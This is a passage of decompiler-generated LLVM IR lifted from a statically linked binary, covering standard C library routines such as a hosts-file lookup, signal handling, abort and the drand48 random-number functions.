  %v1_10012888 = call i32 @__GI_strdup(i32 %v3_10012884)
  store i32 %v1_10012888, i32* %r3.global-to-local, align 4
  %v0_10012890 = load i32, i32* @r29, align 4
  %v1_10012890 = add i32 %v0_10012890, 1
  store i32 %v1_10012890, i32* %r11.global-to-local, align 4
  %v1_10012894 = mul i32 %v0_10012890, 4
  store i32 %v1_10012890, i32* @global_var_1002c3cc.441, align 4
  %v3_100128a0 = add i32 %v1_10012894, ptrtoint (i32* @global_var_10030d2c.443 to i32)
  %v4_100128a0 = inttoptr i32 %v3_100128a0 to i32*
  store i32 %v1_10012888, i32* %v4_100128a0, align 4
  %v0_100128a4.pre = load i32, i32* @r31, align 4
  %v1_100128a4 = load i32, i32* @r27, align 4
  %v2_100128a4 = icmp slt i32 %v0_100128a4.pre, %v1_100128a4
  br i1 %v2_100128a4, label %dec_label_pc_10012884.dec_label_pc_100128bc_crit_edge, label %dec_label_pc_100128c8.backedge

dec_label_pc_10012884.dec_label_pc_100128bc_crit_edge: ; preds = %dec_label_pc_10012884
  %v0_100128ac = load i32, i32* @r1, align 4
  %v1_100128a8 = mul i32 %v0_100128a4.pre, 4
  %v2_100128ac = add i32 %v0_100128ac, %v1_100128a8
  %v3_100128bc.pre = load i32, i32* @global_var_1002c3cc.441, align 4
  br label %dec_label_pc_100128bc

dec_label_pc_100128bc:                            ; preds = %dec_label_pc_1001287c, %dec_label_pc_10012884.dec_label_pc_100128bc_crit_edge
  %v3_100128bc = phi i32 [ %v3_100128bc.pre, %dec_label_pc_10012884.dec_label_pc_100128bc_crit_edge ], [ %v3_100128bc59, %dec_label_pc_1001287c ]
  %v2_100128ac55 = phi i32 [ %v2_100128ac, %dec_label_pc_10012884.dec_label_pc_100128bc_crit_edge ], [ %v2_100128ac54, %dec_label_pc_1001287c ]
  %tmp37 = icmp slt i32 %v3_100128bc, 4
  br i1 %tmp37, label %dec_label_pc_10012884, label %dec_label_pc_100128c8.backedge

dec_label_pc_100128c8:                            ; preds = %dec_label_pc_100128c8.backedge, %dec_label_pc_100128c8.preheader
  %v0_100128d4 = phi i32 [ %v0_100128d4.pre, %dec_label_pc_100128c8.backedge ], [ %v0_100128d416, %dec_label_pc_100128c8.preheader ]
  store i32 %v2_100128c8, i32* %r3.global-to-local, align 4
  store i32 268511452, i32* @lr, align 4
  %v3_100128d8 = call i32 @fgets(i32 %v2_100128c8, i32 128, i32 %v0_100128d4)
  store i32 %v3_100128d8, i32* %r3.global-to-local, align 4
  %v3_100128dc = icmp eq i32 %v3_100128d8, 0
  br i1 %v3_100128dc, label %dec_label_pc_100128ec, label %dec_label_pc_100126d4.preheader

dec_label_pc_100126d4.preheader:                  ; preds = %dec_label_pc_100128c8
  store i32 %v2_100128c8, i32* %r3.global-to-local, align 4
  %v2_100126d43 = load i8, i8* %v1_100126d42, align 4
  %v3_100126d44 = zext i8 %v2_100126d43 to i32
  store i32 %v3_100126d44, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r8, align 4
  %v3_100126dc6 = icmp eq i8 %v2_100126d43, 0
  %v1_100126e08 = mul nuw nsw i32 %v3_100126d44, 2
  store i32 %v1_100126e08, i32* @r10, align 4
  br i1 %v3_100126dc6, label %dec_label_pc_100128c8.backedge, label %dec_label_pc_100126e8.lr.ph

dec_label_pc_100126e8.lr.ph:                      ; preds = %dec_label_pc_100126d4.preheader
  %v3_100126e8.pre = load i32, i32* @global_var_1002c2d0, align 4
  br label %dec_label_pc_100126e8

dec_label_pc_100128ec:                            ; preds = %dec_label_pc_100128c8
  %v0_100128ec = load i32, i32* @r26, align 4
  store i32 %v0_100128ec, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100128f4.457 to i32), i32* @lr, align 4
  %v1_100128f0 = inttoptr i32 %v0_100128ec to i16*
  %v2_100128f0 = call i32 @__GI_fclose(i16* %v1_100128f0)
  store i32 %v2_100128f0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10012904

dec_label_pc_100128f8:                            ; preds = %dec_label_pc_100126b4
  %v0_100128f8 = call i32 @__GI___h_errno_location()
  store i32 %v0_100128f8, i32* %r3.global-to-local, align 4
  %v2_10012900 = inttoptr i32 %v0_100128f8 to i32*
  store i32 3, i32* %v2_10012900, align 4
  br label %dec_label_pc_10012904

dec_label_pc_10012904:                            ; preds = %entry, %dec_label_pc_100128ec, %dec_label_pc_100128f8
  store i32 %v2_10012670, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268511504, i32* @lr, align 4
  %v0_1001290c = call i32 @__pthread_cleanup_pop_restore()
  store i32 %v0_1001290c, i32* %r3.global-to-local, align 4
  ret i32 %v0_1001290c

; uselistorder directives
  uselistorder i32 %v3_100126d44, { 0, 2, 1 }
  uselistorder i32 %v1_1001287446, { 1, 0 }
  uselistorder i32 %v1_1001287045, { 1, 0 }
  uselistorder i32 %v0_1001271c, { 1, 0 }
  uselistorder i32 %v1_1001276c, { 1, 0 }
  uselistorder i8* %v1_10012764, { 0, 2, 1 }
  uselistorder i8 %v2_10012734, { 2, 0, 1 }
  uselistorder i32 %v0_10012730, { 0, 1, 3, 2 }
  uselistorder i32 %v1_100126e0, { 1, 0 }
  uselistorder i32 %v3_100126d4, { 1, 0, 2 }
  uselistorder i32 %v1_100126d0, { 0, 2, 1 }
  uselistorder i32 %v2_100128c8, { 1, 3, 2, 0 }
  uselistorder i32 %v2_10012670, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 23, 2, 3, 4, 29, 22, 15, 26, 5, 6, 24, 7, 8, 9, 25, 10, 11, 12, 13, 28, 14, 27, 0, 16, 17, 18, 19, 1, 21, 20 }
  uselistorder i32* %r11.global-to-local, { 8, 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i32 ()* @__GI___h_errno_location, { 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_1002c3cc.441, { 0, 2, 3, 4, 5, 1, 6, 7, 8 }
  uselistorder i32 ptrtoint (i32* @global_var_10030d2c.443 to i32), { 3, 5, 1, 0, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_10030d3c.319 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002c210.317 to i32), { 1, 0, 7, 3, 8, 12, 2, 9, 13, 4, 10, 14, 6, 5, 11 }
  uselistorder label %dec_label_pc_10012904, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100128bc, { 1, 0 }
  uselistorder label %dec_label_pc_10012840, { 1, 0 }
  uselistorder label %dec_label_pc_1001285c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_100127e8, { 1, 0 }
  uselistorder label %dec_label_pc_100127a4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001279c, { 1, 0 }
  uselistorder label %dec_label_pc_10012764, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012734, { 1, 0 }
  uselistorder label %dec_label_pc_100128c8.backedge, { 4, 3, 2, 1, 7, 6, 5, 0 }
  uselistorder label %dec_label_pc_100128c8.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v4_10012928 = ptrtoint i32* %stack_var_0 to i32
  store i32 %arg6, i32* @r10, align 4
  store i32 %arg5, i32* @r29, align 4
  store i32 268511592, i32* @lr, align 4
  %v9_10012964 = inttoptr i32 %arg3 to i32*
  %v10_10012964 = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_10012964, i32 %arg4, i32 %arg5, i32 %v4_10012928, i32 %arg7)
  ret i32 %v10_10012964
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_1001297c = icmp eq i32 %arg2, -1
  store i32 %arg1, i32* %r31.global-to-local, align 4
  br i1 %v3_1001297c, label %dec_label_pc_100129a8, label %dec_label_pc_10012998

dec_label_pc_10012998:                            ; preds = %entry
  %tmp20 = icmp slt i32 %arg1, 1
  br i1 %tmp20, label %dec_label_pc_100129a8, label %dec_label_pc_100129a0

dec_label_pc_100129a0:                            ; preds = %dec_label_pc_10012998
  %tmp21 = icmp slt i32 %arg1, 65
  br i1 %tmp21, label %dec_label_pc_100129d8.lr.ph, label %dec_label_pc_100129a8

dec_label_pc_100129a8:                            ; preds = %dec_label_pc_100129a0, %dec_label_pc_10012998, %entry
  %v0_100129a8 = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_100129b4 = inttoptr i32 %v0_100129a8 to i32*
  store i32 22, i32* %v2_100129b4, align 4
  %v0_10012a48.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10012a44

dec_label_pc_100129d8.lr.ph:                      ; preds = %dec_label_pc_100129a0
  %v2_100129c8 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_100129c8, i32* @r8, align 4
  store i32 0, i32* @r10, align 4
  store i32 %arg2, i32* %stack_var_-296, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_100129d822 = add i32 %v2_100129c8, 128
  %v3_100129d823 = inttoptr i32 %v2_100129d822 to i32*
  store i32 0, i32* %v3_100129d823, align 4
  %v0_100129dc24 = load i32, i32* %r11.global-to-local, align 4
  %v1_100129dc25 = add i32 %v0_100129dc24, -1
  store i32 %v1_100129dc25, i32* %r11.global-to-local, align 4
  %v1_100129e026 = mul i32 %v1_100129dc25, 4
  %v1_100129e427 = load i32, i32* @r8, align 4
  %v2_100129e428 = add i32 %v1_100129e427, %v1_100129e026
  store i32 %v2_100129e428, i32* %r9.global-to-local, align 4
  %v0_100129e829 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100129e830 = add i32 %v0_100129e829, -1
  store i32 %v1_100129e830, i32* %ctr.global-to-local, align 4
  %v2_100129e831 = icmp eq i32 %v1_100129e830, 0
  br i1 %v2_100129e831, label %dec_label_pc_100129ec, label %dec_label_pc_100129d8.dec_label_pc_100129d8_crit_edge

dec_label_pc_100129d8.dec_label_pc_100129d8_crit_edge: ; preds = %dec_label_pc_100129d8.lr.ph, %dec_label_pc_100129d8.dec_label_pc_100129d8_crit_edge
  %v2_100129e432 = phi i32 [ %v2_100129e4, %dec_label_pc_100129d8.dec_label_pc_100129d8_crit_edge ], [ %v2_100129e428, %dec_label_pc_100129d8.lr.ph ]
  %v0_100129d8.pre = load i32, i32* @r10, align 4
  %v2_100129d8 = add i32 %v2_100129e432, 4
  %v3_100129d8 = inttoptr i32 %v2_100129d8 to i32*
  store i32 %v0_100129d8.pre, i32* %v3_100129d8, align 4
  %v0_100129dc = load i32, i32* %r11.global-to-local, align 4
  %v1_100129dc = add i32 %v0_100129dc, -1
  store i32 %v1_100129dc, i32* %r11.global-to-local, align 4
  %v1_100129e0 = mul i32 %v1_100129dc, 4
  %v1_100129e4 = load i32, i32* @r8, align 4
  %v2_100129e4 = add i32 %v1_100129e4, %v1_100129e0
  store i32 %v2_100129e4, i32* %r9.global-to-local, align 4
  %v0_100129e8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100129e8 = add i32 %v0_100129e8, -1
  store i32 %v1_100129e8, i32* %ctr.global-to-local, align 4
  %v2_100129e8 = icmp eq i32 %v1_100129e8, 0
  br i1 %v2_100129e8, label %dec_label_pc_100129ec, label %dec_label_pc_100129d8.dec_label_pc_100129d8_crit_edge

dec_label_pc_100129ec:                            ; preds = %dec_label_pc_100129d8.dec_label_pc_100129d8_crit_edge, %dec_label_pc_100129d8.lr.ph
  %v0_100129f0.pre = load i32, i32* %r31.global-to-local, align 4
  %v2_100129ec = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v2_100129ec, i32* @r3, align 4
  store i32 %v0_100129f0.pre, i32* @r4, align 4
  %v0_100129f4 = call i32 @__sigaddset()
  %v1_100129f8 = icmp slt i32 %v0_100129f4, 0
  br i1 %v1_100129f8, label %dec_label_pc_10012a40, label %dec_label_pc_10012a00

dec_label_pc_10012a00:                            ; preds = %dec_label_pc_100129ec
  %v0_10012a04 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10012a04, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_10030d48.460 to i32), i32* @r3, align 4
  %v0_10012a0c = call i32 @__sigismember()
  %v2_10012a18 = ptrtoint i32* %stack_var_-156 to i32
  store i32 268511792, i32* @lr, align 4
  %v4_10012a2c = call i32 @__GI_sigaction(i32 %v0_10012a04, i32* nonnull %stack_var_-296, i32 %v2_10012a18)
  %v1_10012a30 = icmp slt i32 %v4_10012a2c, 0
  br i1 %v1_10012a30, label %dec_label_pc_10012a40, label %dec_label_pc_10012a38

dec_label_pc_10012a38:                            ; preds = %dec_label_pc_10012a00
  %v3_10012a38 = load i32, i32* %stack_var_-156, align 4
  store i32 %v3_10012a38, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10012a44

dec_label_pc_10012a40:                            ; preds = %dec_label_pc_10012a00, %dec_label_pc_100129ec
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10012a44

dec_label_pc_10012a44:                            ; preds = %dec_label_pc_10012a38, %dec_label_pc_100129a8, %dec_label_pc_10012a40
  %v0_10012a48 = phi i32 [ %v3_10012a38, %dec_label_pc_10012a38 ], [ %v0_10012a48.pre, %dec_label_pc_100129a8 ], [ -1, %dec_label_pc_10012a40 ]
  ret i32 %v0_10012a48

; uselistorder directives
  uselistorder i32 %v1_100129e8, { 1, 0 }
  uselistorder i32 %v2_100129e4, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 ()* @__sigismember, { 2, 0, 1 }
  uselistorder i32 65, { 1, 2, 6, 8, 9, 7, 4, 5, 3, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10012a44, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100129d8.dec_label_pc_100129d8_crit_edge, { 1, 0 }
}

define i32 @abort(i32 %arg1) local_unnamed_addr {
dec_label_pc_10012a90.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10012a78.462 to i32), i32* @lr, align 4
  %v1_10012a74 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002c228.461 to i32))
  %v2_10012a7c = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_10012a7c, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 31, i32* %r9.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v3_10012a9433 = add i32 %v2_10012a7c, 124
  %v4_10012a9434 = inttoptr i32 %v3_10012a9433 to i32*
  store i32 0, i32* %v4_10012a9434, align 4
  %v0_10012a9835 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012a9836 = add i32 %v0_10012a9835, -1
  store i32 %v1_10012a9836, i32* %r9.global-to-local, align 4
  %v0_10012a9c37 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012a9c38 = add i32 %v0_10012a9c37, -1
  store i32 %v1_10012a9c38, i32* %ctr.global-to-local, align 4
  %v2_10012a9c39 = icmp eq i32 %v1_10012a9c38, 0
  br i1 %v2_10012a9c39, label %dec_label_pc_10012aa0, label %dec_label_pc_10012a90.dec_label_pc_10012a90_crit_edge

dec_label_pc_10012a90.dec_label_pc_10012a90_crit_edge: ; preds = %dec_label_pc_10012a90.lr.ph, %dec_label_pc_10012a90.dec_label_pc_10012a90_crit_edge
  %v1_10012a9840 = phi i32 [ %v1_10012a98, %dec_label_pc_10012a90.dec_label_pc_10012a90_crit_edge ], [ %v1_10012a9836, %dec_label_pc_10012a90.lr.ph ]
  %v0_10012a94.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_10012a94.pre = load i32, i32* %r29.global-to-local, align 4
  %v1_10012a90 = mul i32 %v1_10012a9840, 4
  %v3_10012a94 = add i32 %v1_10012a90, %v1_10012a94.pre
  %v4_10012a94 = inttoptr i32 %v3_10012a94 to i32*
  store i32 %v0_10012a94.pre, i32* %v4_10012a94, align 4
  %v0_10012a98 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012a98 = add i32 %v0_10012a98, -1
  store i32 %v1_10012a98, i32* %r9.global-to-local, align 4
  %v0_10012a9c = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012a9c = add i32 %v0_10012a9c, -1
  store i32 %v1_10012a9c, i32* %ctr.global-to-local, align 4
  %v2_10012a9c = icmp eq i32 %v1_10012a9c, 0
  br i1 %v2_10012a9c, label %dec_label_pc_10012aa0, label %dec_label_pc_10012a90.dec_label_pc_10012a90_crit_edge

dec_label_pc_10012aa0:                            ; preds = %dec_label_pc_10012a90.dec_label_pc_10012a90_crit_edge, %dec_label_pc_10012a90.lr.ph
  store i32 %v2_10012a7c, i32* @r3, align 4
  store i32 6, i32* @r4, align 4
  %v0_10012aa8 = call i32 @__sigaddset()
  %v3_10012aac = icmp eq i32 %v0_10012aa8, 0
  br i1 %v3_10012aac, label %dec_label_pc_10012ab4, label %dec_label_pc_10012ac4

dec_label_pc_10012ab4:                            ; preds = %dec_label_pc_10012aa0
  store i32 268511940, i32* @lr, align 4
  %v3_10012ac0 = call i32 @__GI_sigprocmask(i32 1, i32 %v2_10012a7c, i32 0)
  br label %dec_label_pc_10012ac4

dec_label_pc_10012ac4:                            ; preds = %dec_label_pc_10012aa0, %dec_label_pc_10012ab4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r9, align 4
  %v3_10012ac8 = load i32, i32* @global_var_1002c3d0.463, align 4
  %v3_10012acc = icmp eq i32 %v3_10012ac8, 0
  br i1 %v3_10012acc, label %dec_label_pc_10012ad4, label %dec_label_pc_10012afc

dec_label_pc_10012ad4:                            ; preds = %dec_label_pc_10012ac4
  store i32 1, i32* @global_var_1002c3d0.463, align 4
  br label %dec_label_pc_10012adc

dec_label_pc_10012adc:                            ; preds = %dec_label_pc_10012b58, %dec_label_pc_10012ad4
  store i32 ptrtoint (i32* @global_var_1002c228.461 to i32), i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1002c228.461 to i32), i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10012aec.464 to i32), i32* @lr, align 4
  %v0_10012ae8 = call i32 @pthread_mutex_unlock()
  store i32 268511988, i32* @lr, align 4
  %v1_10012af0 = call i32 @__GI_raise(i32 6)
  %v0_10012af4 = load i32, i32* @r29, align 4
  store i32 268511996, i32* @lr, align 4
  %v1_10012af8 = call i32 @pthread_mutex_lock(i32 %v0_10012af4)
  %v3_10012b00.pre = load i32, i32* @global_var_1002c3d0.463, align 4
  br label %dec_label_pc_10012afc

dec_label_pc_10012afc:                            ; preds = %dec_label_pc_10012ac4, %dec_label_pc_10012adc
  %v0_10012b74 = phi i32 [ %v3_10012ac8, %dec_label_pc_10012ac4 ], [ %v3_10012b00.pre, %dec_label_pc_10012adc ]
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_10012b04 = icmp eq i32 %v0_10012b74, 1
  br i1 %v3_10012b04, label %dec_label_pc_10012b44.lr.ph, label %dec_label_pc_10012b74

dec_label_pc_10012b44.lr.ph:                      ; preds = %dec_label_pc_10012afc
  %v2_10012b10 = ptrtoint i32* %stack_var_-168 to i32
  store i32 2, i32* @global_var_1002c3d0.463, align 4
  store i32 ptrtoint (i32* @global_var_10012b24.465 to i32), i32* @lr, align 4
  %v3_10012b20 = call i32 @__GI_memset(i32 %v2_10012b10, i32 0, i32 140)
  store i32 %v2_10012a7c, i32* @r8, align 4
  store i32 -1, i32* @r10, align 4
  store i32 0, i32* %stack_var_-168, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 %v3_10012a9433, i32* %r9.global-to-local, align 4
  %v2_10012b4c25 = add i32 %v2_10012a7c, 256
  %v3_10012b4c26 = inttoptr i32 %v2_10012b4c25 to i32*
  store i32 -1, i32* %v3_10012b4c26, align 4
  %v0_10012b5027 = load i32, i32* %r11.global-to-local, align 4
  %v1_10012b5028 = add i32 %v0_10012b5027, -1
  store i32 %v1_10012b5028, i32* @r11, align 4
  %v0_10012b5429 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012b5430 = add i32 %v0_10012b5429, -1
  store i32 %v1_10012b5430, i32* %ctr.global-to-local, align 4
  %v2_10012b5431 = icmp eq i32 %v1_10012b5430, 0
  br i1 %v2_10012b5431, label %dec_label_pc_10012b58, label %dec_label_pc_10012b44.dec_label_pc_10012b44_crit_edge

dec_label_pc_10012b44.dec_label_pc_10012b44_crit_edge: ; preds = %dec_label_pc_10012b44.lr.ph, %dec_label_pc_10012b44.dec_label_pc_10012b44_crit_edge
  %v1_10012b5032 = phi i32 [ %v1_10012b50, %dec_label_pc_10012b44.dec_label_pc_10012b44_crit_edge ], [ %v1_10012b5028, %dec_label_pc_10012b44.lr.ph ]
  %v1_10012b48.pre = load i32, i32* @r8, align 4
  %v0_10012b4c.pre = load i32, i32* @r10, align 4
  %v1_10012b44 = mul i32 %v1_10012b5032, 4
  %v2_10012b48 = add i32 %v1_10012b44, %v1_10012b48.pre
  store i32 %v2_10012b48, i32* %r9.global-to-local, align 4
  %v2_10012b4c = add i32 %v2_10012b48, 132
  %v3_10012b4c = inttoptr i32 %v2_10012b4c to i32*
  store i32 %v0_10012b4c.pre, i32* %v3_10012b4c, align 4
  %v0_10012b50 = load i32, i32* @r11, align 4
  %v1_10012b50 = add i32 %v0_10012b50, -1
  store i32 %v1_10012b50, i32* @r11, align 4
  %v0_10012b54 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012b54 = add i32 %v0_10012b54, -1
  store i32 %v1_10012b54, i32* %ctr.global-to-local, align 4
  %v2_10012b54 = icmp eq i32 %v1_10012b54, 0
  br i1 %v2_10012b54, label %dec_label_pc_10012b58, label %dec_label_pc_10012b44.dec_label_pc_10012b44_crit_edge

dec_label_pc_10012b58:                            ; preds = %dec_label_pc_10012b44.dec_label_pc_10012b44_crit_edge, %dec_label_pc_10012b44.lr.ph
  store i32 268512112, i32* @lr, align 4
  %v4_10012b6c = call i32 @__GI_sigaction(i32 6, i32* nonnull %stack_var_-168, i32 0)
  br label %dec_label_pc_10012adc

dec_label_pc_10012b74:                            ; preds = %dec_label_pc_10012afc
  %v3_10012b74 = icmp eq i32 %v0_10012b74, 2
  br i1 %v3_10012b74, label %dec_label_pc_10012b7c, label %dec_label_pc_10012b88

dec_label_pc_10012b7c:                            ; preds = %dec_label_pc_10012b74
  store i32 3, i32* @global_var_1002c3d0.463, align 4
  br label %dec_label_pc_10012b88

dec_label_pc_10012b88:                            ; preds = %dec_label_pc_10012b74, %dec_label_pc_10012b7c
  %v3_10012b88 = phi i32 [ %v0_10012b74, %dec_label_pc_10012b74 ], [ 3, %dec_label_pc_10012b7c ]
  %v1_10012b90 = icmp ne i32 %v3_10012b88, 3
  call void @__pseudo_cond_branch(i1 %v1_10012b90, i32 268512164)
  store i32 4, i32* @global_var_1002c3d0.463, align 4
  %v1_10012ba0 = call i32 @__GI__exit(i32 127)
  ret i32 %v1_10012ba0

; uselistorder directives
  uselistorder i32 %v1_10012b54, { 1, 0 }
  uselistorder i32 %v1_10012b50, { 1, 0 }
  uselistorder i32 %v1_10012a9c, { 1, 0 }
  uselistorder i32 %v1_10012a98, { 1, 0 }
  uselistorder i32 %v2_10012a7c, { 0, 2, 3, 4, 1, 5 }
  uselistorder i32* %r9.global-to-local, { 6, 0, 7, 3, 2, 1, 4, 5 }
  uselistorder i32* %r11.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %ctr.global-to-local, { 9, 8, 0, 4, 5, 3, 2, 1, 6, 7 }
  uselistorder i32 (i32)* @__GI__exit, { 2, 1, 5, 7, 4, 3, 0, 6 }
  uselistorder i32 127, { 1, 4, 0, 2, 3, 5 }
  uselistorder i32 (i32, i32*, i32)* @__GI_sigaction, { 3, 0, 2, 1 }
  uselistorder i32 132, { 4, 0, 1, 2, 3 }
  uselistorder i32* @r11, { 39, 40, 3, 30, 31, 32, 33, 24, 25, 26, 27, 47, 48, 49, 34, 35, 5, 36, 37, 42, 43, 0, 54, 41, 6, 59, 60, 61, 62, 63, 64, 65, 66, 28, 29, 55, 56, 57, 10, 11, 51, 7, 52, 53, 12, 20, 21, 58, 13, 14, 16, 17, 18, 19, 15, 38, 46, 1, 4, 2, 45, 22, 44, 8, 50, 9, 23 }
  uselistorder i32 ()* @pthread_mutex_unlock, { 9, 11, 10, 2, 1, 0, 8, 7, 6, 20, 19, 18, 17, 21, 5, 4, 22, 3, 16, 15, 14, 13, 12 }
  uselistorder i32* @global_var_1002c3d0.463, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @__GI_sigprocmask, { 1, 5, 4, 3, 2, 8, 13, 14, 12, 15, 11, 10, 9, 0, 7, 6 }
  uselistorder i32 ()* @__sigaddset, { 0, 4, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_1002c228.461 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_10012b88, { 1, 0 }
  uselistorder label %dec_label_pc_10012b44.dec_label_pc_10012b44_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10012afc, { 1, 0 }
  uselistorder label %dec_label_pc_10012ac4, { 1, 0 }
  uselistorder label %dec_label_pc_10012a90.dec_label_pc_10012a90_crit_edge, { 1, 0 }
}

define i32 @lrand48_r(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r4, align 4
  %v2_10012bb4 = inttoptr i32 %arg2 to i32*
  %v3_10012bb4 = call i32 @nrand48_r(i32 %arg1, i32* %v2_10012bb4)
  ret i32 %v3_10012bb4
}

define i32 @nrand48_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* @r3, align 4
  store i32 %tmp, i32* %r30.global-to-local, align 4
  store i32 %arg1, i32* @r31, align 4
  %v0_10012bd0 = call i32 @__drand48_iterate()
  %v1_10012bd4 = icmp slt i32 %v0_10012bd0, 0
  store i32 -1, i32* %r3.global-to-local, align 4
  br i1 %v1_10012bd4, label %dec_label_pc_10012bfc, label %dec_label_pc_10012be0

dec_label_pc_10012be0:                            ; preds = %entry
  %v0_10012be0 = load i32, i32* @r31, align 4
  %v1_10012be0 = add i32 %v0_10012be0, 2
  %v2_10012be0 = inttoptr i32 %v1_10012be0 to i16*
  %v3_10012be0 = load i16, i16* %v2_10012be0, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10012be8 = add i32 %v0_10012be0, 4
  %v2_10012be8 = inttoptr i32 %v1_10012be8 to i16*
  %v3_10012be8 = load i16, i16* %v2_10012be8, align 2
  %v4_10012be8 = zext i16 %v3_10012be8 to i32
  %div = udiv i16 %v3_10012be0, 2
  %v1_10012bec = zext i16 %div to i32
  %v1_10012bf0 = mul nuw i32 %v4_10012be8, 32768
  %v2_10012bf4 = or i32 %v1_10012bf0, %v1_10012bec
  %v1_10012bf8 = load i32, i32* %r30.global-to-local, align 4
  %v2_10012bf8 = inttoptr i32 %v1_10012bf8 to i32*
  store i32 %v2_10012bf4, i32* %v2_10012bf8, align 4
  %v0_10012c0c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10012bfc

dec_label_pc_10012bfc:                            ; preds = %entry, %dec_label_pc_10012be0
  %v0_10012c0c = phi i32 [ -1, %entry ], [ %v0_10012c0c.pre, %dec_label_pc_10012be0 ]
  ret i32 %v0_10012c0c

; uselistorder directives
  uselistorder label %dec_label_pc_10012bfc, { 1, 0 }
}

define i32 @__GI_srand48_r(i16 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i16*
  %tmp1 = sext i16 %arg1 to i32
  %v5_10012c14 = sdiv i32 %tmp1, 65536
  store i32 %v5_10012c14, i32* %r9.global-to-local, align 4
  %v4_10012c18 = add i32 %arg2, 14
  %v5_10012c18 = inttoptr i32 %v4_10012c18 to i16*
  store i16 1, i16* %v5_10012c18, align 2
  store i32 -554958848, i32* %r10.global-to-local, align 4
  store i32 13070, i32* %r0.global-to-local, align 4
  %v0_10012c24 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012c24 = trunc i32 %v0_10012c24 to i16
  %v4_10012c24 = add i32 %arg2, 4
  %v5_10012c24 = inttoptr i32 %v4_10012c24 to i16*
  store i16 %v1_10012c24, i16* %v5_10012c24, align 2
  %v5_10012c28 = add i32 %arg2, 2
  %v6_10012c28 = inttoptr i32 %v5_10012c28 to i16*
  store i16 %arg1, i16* %v6_10012c28, align 2
